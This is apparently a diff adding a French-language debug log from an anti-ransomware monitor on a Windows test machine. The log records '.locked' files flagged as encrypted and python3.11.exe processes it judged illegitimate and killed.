+2025-07-24 22:46:59.733Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (8).bmp.locked
+2025-07-24 22:46:59.733Z [DEBUG] ProcessId détecté : 10808
+2025-07-24 22:46:59.749Z [WARN] Processus PID 10808 non trouvé
+2025-07-24 22:46:59.749Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie (9).bmp.locked'
+2025-07-24 22:46:59.749Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie (9).bmp.locked
+2025-07-24 22:46:59.749Z [DEBUG] ProcessId détecté : 8248
+2025-07-24 22:46:59.749Z [WARN] Processus PID 8248 non trouvé
+2025-07-24 22:46:59.749Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap - copie.bmp.locked'
+2025-07-24 22:46:59.764Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap - copie.bmp.locked
+2025-07-24 22:46:59.764Z [DEBUG] ProcessId détecté : 11076
+2025-07-24 22:46:59.764Z [WARN] Processus PID 11076 non trouvé
+2025-07-24 22:46:59.764Z [DEBUG] Fichier cible détecté : 'c:\test\nouvelle image bitmap.bmp.locked'
+2025-07-24 22:46:59.764Z [🧨] Fichier chiffré détecté : c:\test\nouvelle image bitmap.bmp.locked
+2025-07-24 22:46:59.764Z [DEBUG] ProcessId détecté : 4040
+2025-07-24 22:46:59.764Z [WARN] Processus PID 4040 non trouvé
+2025-07-24 22:46:59.799Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked'
+2025-07-24 22:46:59.799Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
+2025-07-24 22:46:59.799Z [DEBUG] ProcessId détecté : 10872
+2025-07-24 22:46:59.799Z [WARN] Processus PID 10872 non trouvé
+2025-07-24 22:46:59.811Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked'
+2025-07-24 22:46:59.811Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
+2025-07-24 22:46:59.811Z [DEBUG] ProcessId détecté : 10152
+2025-07-24 22:46:59.811Z [WARN] Processus PID 10152 non trouvé
+2025-07-24 22:46:59.811Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked'
+2025-07-24 22:46:59.811Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
+2025-07-24 22:46:59.811Z [DEBUG] ProcessId détecté : 10368
+2025-07-24 22:46:59.811Z [WARN] Processus PID 10368 non trouvé
+2025-07-24 22:46:59.811Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked'
+2025-07-24 22:46:59.826Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
+2025-07-24 22:46:59.826Z [DEBUG] ProcessId détecté : 9888
+2025-07-24 22:46:59.826Z [WARN] Processus PID 9888 non trouvé
+2025-07-24 22:46:59.826Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked'
+2025-07-24 22:46:59.826Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
+2025-07-24 22:46:59.826Z [DEBUG] ProcessId détecté : 6224
+2025-07-24 22:46:59.826Z [WARN] Processus PID 6224 non trouvé
+2025-07-24 22:46:59.842Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked'
+2025-07-24 22:46:59.842Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
+2025-07-24 22:46:59.842Z [DEBUG] ProcessId détecté : 11076
+2025-07-24 22:46:59.842Z [WARN] Processus PID 11076 non trouvé
+2025-07-24 22:46:59.860Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked'
+2025-07-24 22:46:59.862Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
+2025-07-24 22:46:59.863Z [DEBUG] ProcessId détecté : 9824
+2025-07-24 22:46:59.865Z [WARN] Processus PID 9824 non trouvé
+2025-07-24 22:46:59.894Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\searches\indexed locations.search-ms.locked'
+2025-07-24 22:46:59.896Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\indexed locations.search-ms.locked
+2025-07-24 22:46:59.898Z [DEBUG] ProcessId détecté : 6880
+2025-07-24 22:46:59.899Z [WARN] Processus PID 6880 non trouvé
+2025-07-24 22:46:59.901Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\searches\everywhere.search-ms.locked'
+2025-07-24 22:46:59.902Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\everywhere.search-ms.locked
+2025-07-24 22:46:59.906Z [DEBUG] ProcessId détecté : 4040
+2025-07-24 22:46:59.908Z [WARN] Processus PID 4040 non trouvé
+2025-07-24 22:46:59.916Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked'
+2025-07-24 22:46:59.917Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
+2025-07-24 22:46:59.924Z [DEBUG] ProcessId détecté : 8484
+2025-07-24 22:46:59.930Z [WARN] Processus PID 8484 non trouvé
+2025-07-24 22:46:59.933Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked'
+2025-07-24 22:46:59.934Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
+2025-07-24 22:46:59.942Z [DEBUG] ProcessId détecté : 3884
+2025-07-24 22:46:59.943Z [WARN] Processus PID 3884 non trouvé
+2025-07-24 22:46:59.946Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked'
+2025-07-24 22:46:59.947Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
+2025-07-24 22:46:59.948Z [DEBUG] ProcessId détecté : 4388
+2025-07-24 22:46:59.950Z [WARN] Processus PID 4388 non trouvé
+2025-07-24 22:46:59.960Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked'
+2025-07-24 22:46:59.961Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
+2025-07-24 22:46:59.962Z [DEBUG] ProcessId détecté : 8144
+2025-07-24 22:46:59.965Z [WARN] Processus PID 8144 non trouvé
+2025-07-24 22:46:59.967Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked'
+2025-07-24 22:46:59.970Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
+2025-07-24 22:46:59.971Z [DEBUG] ProcessId détecté : 3108
+2025-07-24 22:46:59.973Z [WARN] Processus PID 3108 non trouvé
+2025-07-24 22:46:59.978Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked'
+2025-07-24 22:46:59.979Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
+2025-07-24 22:46:59.981Z [DEBUG] ProcessId détecté : 10388
+2025-07-24 22:46:59.983Z [WARN] Processus PID 10388 non trouvé
+2025-07-24 22:46:59.991Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked'
+2025-07-24 22:46:59.992Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
+2025-07-24 22:46:59.997Z [DEBUG] ProcessId détecté : 5424
+2025-07-24 22:46:59.999Z [WARN] Processus PID 5424 non trouvé
+2025-07-24 22:47:00.014Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\searches\indexed locations.search-ms.locked'
+2025-07-24 22:47:00.014Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\indexed locations.search-ms.locked
+2025-07-24 22:47:00.014Z [DEBUG] ProcessId détecté : 10388
+2025-07-24 22:47:00.031Z [WARN] Processus PID 10388 non trouvé
+2025-07-24 22:47:00.031Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\searches\everywhere.search-ms.locked'
+2025-07-24 22:47:00.031Z [🧨] Fichier chiffré détecté : c:\users\mehdi\searches\everywhere.search-ms.locked
+2025-07-24 22:47:00.031Z [DEBUG] ProcessId détecté : 8144
+2025-07-24 22:47:00.046Z [WARN] Processus PID 8144 non trouvé
+2025-07-24 22:47:00.108Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\appdata\roaming\microsoft\windows\themes\watchdog.vbs'
+2025-07-24 22:47:00.174Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\appdata\roaming\microsoft\windows\themes\watchdog.vbs'
+2025-07-24 22:47:00.221Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked'
+2025-07-24 22:47:00.221Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
+2025-07-24 22:47:00.221Z [DEBUG] ProcessId détecté : 8980
+2025-07-24 22:47:00.221Z [WARN] Processus PID 8980 non trouvé
+2025-07-24 22:47:00.221Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked'
+2025-07-24 22:47:00.221Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
+2025-07-24 22:47:00.221Z [DEBUG] ProcessId détecté : 10916
+2025-07-24 22:47:00.221Z [WARN] Processus PID 10916 non trouvé
+2025-07-24 22:47:00.237Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked'
+2025-07-24 22:47:00.237Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
+2025-07-24 22:47:00.237Z [DEBUG] ProcessId détecté : 6296
+2025-07-24 22:47:00.237Z [WARN] Processus PID 6296 non trouvé
+2025-07-24 22:47:00.237Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked'
+2025-07-24 22:47:00.237Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
+2025-07-24 22:47:00.253Z [DEBUG] ProcessId détecté : 1976
+2025-07-24 22:47:00.253Z [WARN] Processus PID 1976 non trouvé
+2025-07-24 22:47:00.253Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked'
+2025-07-24 22:47:00.253Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
+2025-07-24 22:47:00.268Z [DEBUG] ProcessId détecté : 5468
+2025-07-24 22:47:00.268Z [WARN] Processus PID 5468 non trouvé
+2025-07-24 22:47:00.268Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked'
+2025-07-24 22:47:00.268Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
+2025-07-24 22:47:00.268Z [DEBUG] ProcessId détecté : 9692
+2025-07-24 22:47:00.268Z [WARN] Processus PID 9692 non trouvé
+2025-07-24 22:47:00.268Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked'
+2025-07-24 22:47:00.268Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
+2025-07-24 22:47:00.268Z [DEBUG] ProcessId détecté : 10400
+2025-07-24 22:47:00.268Z [WARN] Processus PID 10400 non trouvé
+2025-07-24 22:47:17.679Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\appdata\roaming\microsoft\windows\themes\watchdog.vbs'
+2025-07-24 22:47:38.924Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\appdata\roaming\microsoft\windows\themes\watchdog.vbs'
+2025-07-24 22:48:31.097Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked'
+2025-07-24 22:48:31.113Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
+2025-07-24 22:48:31.207Z [DEBUG] ProcessId détecté : 7664
+2025-07-24 22:48:31.269Z [INFO] kill_process_tree appelé pour PID 7664 (python3.11.exe)
+2025-07-24 22:48:31.472Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:31.472Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:31.488Z [🔪] Kill parent PID 11096 (python3.11.exe)
+2025-07-24 22:48:31.582Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:31.582Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:31.613Z [🔪] Kill parent PID 7664 (python3.11.exe)
+2025-07-24 22:48:31.676Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked'
+2025-07-24 22:48:31.691Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
+2025-07-24 22:48:31.691Z [DEBUG] ProcessId détecté : 10992
+2025-07-24 22:48:31.691Z [INFO] kill_process_tree appelé pour PID 10992 (python3.11.exe)
+2025-07-24 22:48:31.707Z [ERROR] Erreur kill parent PID 11096 : process PID not found (pid=11096)
+2025-07-24 22:48:31.707Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:31.707Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:31.707Z [🔪] Kill parent PID 10992 (python3.11.exe)
+2025-07-24 22:48:31.722Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked'
+2025-07-24 22:48:31.879Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
+2025-07-24 22:48:31.879Z [DEBUG] ProcessId détecté : 1056
+2025-07-24 22:48:31.879Z [INFO] kill_process_tree appelé pour PID 1056 (python3.11.exe)
+2025-07-24 22:48:31.894Z [ERROR] Erreur kill parent PID 11096 : process PID not found (pid=11096)
+2025-07-24 22:48:31.894Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:32.003Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:32.050Z [🔪] Kill parent PID 1056 (python3.11.exe)
+2025-07-24 22:48:32.082Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked'
+2025-07-24 22:48:32.082Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
+2025-07-24 22:48:32.113Z [DEBUG] ProcessId détecté : 4892
+2025-07-24 22:48:32.129Z [INFO] kill_process_tree appelé pour PID 4892 (python3.11.exe)
+2025-07-24 22:48:32.285Z [ERROR] Erreur kill parent PID 11096 : process PID not found (pid=11096)
+2025-07-24 22:48:32.410Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:32.410Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:32.426Z [🔪] Kill parent PID 4892 (python3.11.exe)
+2025-07-24 22:48:32.598Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked'
+2025-07-24 22:48:32.629Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
+2025-07-24 22:48:32.691Z [DEBUG] ProcessId détecté : 4220
+2025-07-24 22:48:32.800Z [INFO] kill_process_tree appelé pour PID 4220 (python3.11.exe)
+2025-07-24 22:48:32.926Z [ERROR] Erreur kill parent PID 11096 : process PID not found (pid=11096)
+2025-07-24 22:48:33.004Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:33.097Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:33.129Z [🔪] Kill parent PID 4220 (python3.11.exe)
+2025-07-24 22:48:33.129Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked'
+2025-07-24 22:48:33.129Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
+2025-07-24 22:48:33.129Z [DEBUG] ProcessId détecté : 5684
+2025-07-24 22:48:33.144Z [INFO] kill_process_tree appelé pour PID 5684 (python3.11.exe)
+2025-07-24 22:48:33.160Z [ERROR] Erreur kill parent PID 11096 : process PID not found (pid=11096)
+2025-07-24 22:48:33.175Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:33.175Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:33.175Z [🔪] Kill parent PID 5684 (python3.11.exe)
+2025-07-24 22:48:33.175Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked'
+2025-07-24 22:48:33.191Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
+2025-07-24 22:48:33.191Z [DEBUG] ProcessId détecté : 10192
+2025-07-24 22:48:33.191Z [INFO] kill_process_tree appelé pour PID 10192 (python3.11.exe)
+2025-07-24 22:48:33.206Z [ERROR] Erreur kill parent PID 11096 : process PID not found (pid=11096)
+2025-07-24 22:48:33.222Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:33.222Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:33.222Z [🔪] Kill parent PID 10192 (python3.11.exe)
+2025-07-24 22:48:42.916Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked'
+2025-07-24 22:48:42.979Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000001.regtrans-ms.locked
+2025-07-24 22:48:43.104Z [DEBUG] ProcessId détecté : 10936
+2025-07-24 22:48:43.620Z [INFO] kill_process_tree appelé pour PID 10936 (python3.11.exe)
+2025-07-24 22:48:43.682Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:43.760Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:43.807Z [🔪] Kill parent PID 7568 (python3.11.exe)
+2025-07-24 22:48:44.323Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:44.369Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:44.369Z [🔪] Kill parent PID 10936 (python3.11.exe)
+2025-07-24 22:48:44.369Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked'
+2025-07-24 22:48:44.385Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.blf.locked
+2025-07-24 22:48:44.385Z [DEBUG] ProcessId détecté : 8256
+2025-07-24 22:48:44.385Z [INFO] kill_process_tree appelé pour PID 8256 (python3.11.exe)
+2025-07-24 22:48:44.401Z [ERROR] Erreur kill parent PID 7568 : process PID not found (pid=7568)
+2025-07-24 22:48:44.416Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:44.416Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:44.416Z [🔪] Kill parent PID 8256 (python3.11.exe)
+2025-07-24 22:48:44.416Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked'
+2025-07-24 22:48:44.416Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.2.regtrans-ms.locked
+2025-07-24 22:48:44.416Z [DEBUG] ProcessId détecté : 6004
+2025-07-24 22:48:44.416Z [INFO] kill_process_tree appelé pour PID 6004 (python3.11.exe)
+2025-07-24 22:48:44.447Z [ERROR] Erreur kill parent PID 7568 : process PID not found (pid=7568)
+2025-07-24 22:48:44.464Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:44.464Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:44.464Z [🔪] Kill parent PID 6004 (python3.11.exe)
+2025-07-24 22:48:44.479Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked'
+2025-07-24 22:48:44.479Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tm.blf.locked
+2025-07-24 22:48:44.479Z [DEBUG] ProcessId détecté : 9812
+2025-07-24 22:48:44.479Z [INFO] kill_process_tree appelé pour PID 9812 (python3.11.exe)
+2025-07-24 22:48:44.479Z [ERROR] Erreur kill parent PID 7568 : process PID not found (pid=7568)
+2025-07-24 22:48:44.495Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:44.495Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:44.510Z [🔪] Kill parent PID 9812 (python3.11.exe)
+2025-07-24 22:48:44.510Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked'
+2025-07-24 22:48:44.510Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.0.regtrans-ms.locked
+2025-07-24 22:48:44.510Z [DEBUG] ProcessId détecté : 5572
+2025-07-24 22:48:44.510Z [INFO] kill_process_tree appelé pour PID 5572 (python3.11.exe)
+2025-07-24 22:48:44.526Z [ERROR] Erreur kill parent PID 7568 : process PID not found (pid=7568)
+2025-07-24 22:48:44.541Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:44.541Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:44.541Z [🔪] Kill parent PID 5572 (python3.11.exe)
+2025-07-24 22:48:44.541Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked'
+2025-07-24 22:48:44.541Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e87-18c4-11ea-a811-000d3aa4692b}.txr.1.regtrans-ms.locked
+2025-07-24 22:48:44.541Z [DEBUG] ProcessId détecté : 7836
+2025-07-24 22:48:44.541Z [INFO] kill_process_tree appelé pour PID 7836 (python3.11.exe)
+2025-07-24 22:48:44.557Z [ERROR] Erreur kill parent PID 7568 : process PID not found (pid=7568)
+2025-07-24 22:48:44.573Z [DEBUG] Vérification légitimité : name=python3.11.exe, user=windows10\mehdi, exe=c:\program files\windowsapps\pythonsoftwarefoundation.python.3.11_3.11.2544.0_x64__qbz5n2kfra8p0\python3.11.exe
+2025-07-24 22:48:44.573Z [DEBUG] Processus python3.11.exe considéré NON légitime
+2025-07-24 22:48:44.573Z [🔪] Kill parent PID 7836 (python3.11.exe)
+2025-07-24 22:48:44.588Z [DEBUG] Fichier cible détecté : 'c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked'
+2025-07-24 22:48:44.588Z [🧨] Fichier chiffré détecté : c:\users\mehdi\ntuser.dat{53b39e88-18c4-11ea-a811-000d3aa4692b}.tmcontainer00000000000000000002.regtrans-ms.locked
+2025-07-24 22:48:44.588Z [DEBUG] ProcessId détecté : 10468
